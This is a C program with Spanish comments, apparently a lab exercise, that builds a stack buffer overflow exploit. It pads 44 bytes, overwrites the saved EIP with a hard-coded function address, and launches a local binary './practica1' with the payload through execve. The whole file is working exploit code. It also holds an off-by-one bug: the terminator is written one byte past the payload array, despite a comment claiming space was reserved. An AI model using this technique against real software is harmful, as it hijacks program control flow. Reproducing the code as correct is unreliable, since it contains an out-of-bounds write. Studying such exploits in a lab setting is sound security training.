#include <stdio.h>    // entrada y salida estandar
#include <stdlib.h>   // funciones como malloc,calloc,exit()
#include <string.h>   // manipular bloques de string memset y memcpy
#include <unistd.h>   // funcion de ejecucion y llamadas al syscalls

int main()
{
  const int BYTE_PADDING = 0x41;
  const int OFFSET = 44;                      // Offset antes de escribir en el EIP.
  const unsigned int FUNC_ADDR = 0x565561c9;  // Direccion de memoria del func.
  const int WORD_SIZE = sizeof(FUNC_ADDR);// Tamaño de la direccion de memeoria.
  const int PAYLOAD_LENGHT = OFFSET + WORD_SIZE; // tamaño total del payload
  
  printf("\n Empezando a llenar el payload ...");
  sleep(1);
  printf("\nOFFSET : %d", OFFSET);
  usleep(1);
  printf("\nDireccion de func() : %p\n",FUNC_ADDR);

  // Empezamos a construir el payload
  printf("\n\nConstruyendo el payload... \n");
  sleep(1);
  
  // Creamos un arreglo con espacio para el 44 del OFFSET.
  // El espacio de la direccion 4 bytes en 32 bits
  // Un espacio extra para el \0 el fin de linea EOL.
  char payload [PAYLOAD_LENGHT];
  printf("\n Llenando payload de %d de caracteres 'A' \n",OFFSET);
  // memset(void *s , int c , size_t n);
  // s -> puntero donde se llenara.
  // c -> byte a copiar.
  // n -> cantidad de bytes a llenar.
  memset(payload, BYTE_PADDING, OFFSET);
  sleep(1);
  // una vez llenado el padding vamos a meter nuestra direccion.
  // Basicamente estamos en la mera entrada del EIP , entonces
  // vamos a meter nuestra direccion de memeoria para que se ejecute.
  // 
  // Copia n bytes a una direccion de memoria:
  // memcpy(void * dest, const void *src , size_t n);
  // dest -> bloque de memoria 
  // src -> bloque de memoria de origen.
  // n -> numero de bytes a copiar.
  printf("\n Sobreescribiendo el EIP con : %p \n", FUNC_ADDR);
  memcpy(payload + OFFSET , &FUNC_ADDR , WORD_SIZE);
  usleep(1);
  printf("\n Colocando el fin de linea\n");
  payload[PAYLOAD_LENGHT] = '\0';

  // Payload Listo
  printf("\n Payload Listo..\n");
  // Ejecutando el exploit
  printf("\n Ejecutando exploit ...\n");
  // argv[0] → "./practica1"
  // argv[1] → payload
  // argv[2] → NULL   ← aquí execve se detiene
  char *argv[] = {"./practica1", payload, NULL};
  // hacemos que se ejecute
  // int execve(const char *pathname, char *const argv[], char *const envp[]);
  // pathname -> ejecutable que quiera correr
  // argv -> argumentos del programa.
  // envp -> variables de entorno.
  execve(argv[0], argv , NULL);
  perror("execve"); 
  return 0;
}
